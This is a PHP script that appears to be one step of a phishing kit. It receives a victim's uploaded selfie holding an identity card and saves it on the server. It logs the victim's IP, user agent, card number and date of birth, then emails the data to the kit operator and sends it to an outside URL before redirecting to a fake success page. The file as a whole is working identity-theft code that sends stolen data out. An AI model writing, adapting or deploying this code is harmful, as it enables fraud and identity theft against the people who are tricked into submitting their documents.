<?php
  error_reporting(0);
  ob_start();
  session_start();
 
include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){

$random = rand(0, 100008400000);
$img = $_POST['data'];
  $img = str_replace('data:image/jpeg;base64,', '', $img);
  $img = str_replace(' ', '+', $img);
  $data = base64_decode($img);
  $file = $random.'.jpg';
  $success = file_put_contents('../cni/'.$file, $data);
$message = '
_______________________________
SELFIE CNI/CC : '.$_SERVER['HTTP_HOST'].'/login/info/cni/'.$file.'
_______________________________
IP: '._ip().'
User Agent: '.$_SERVER['HTTP_USER_AGENT'].'
';

$Subject="\xf0\x9f\x83\x8f CNI - ".$_SESSION['n_card']." - ".$_SESSION['DOB']." \xf0\x9f\x83\x8f | "._ip();
$head="From:\xf0\x9f\x95\xb7 Ayz \xf0\x9f\x95\xb7  <cni@ayz.com>";

$fil = fopen('cni_ayz.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_six']  = true;
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
header('location: ../success.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}


?>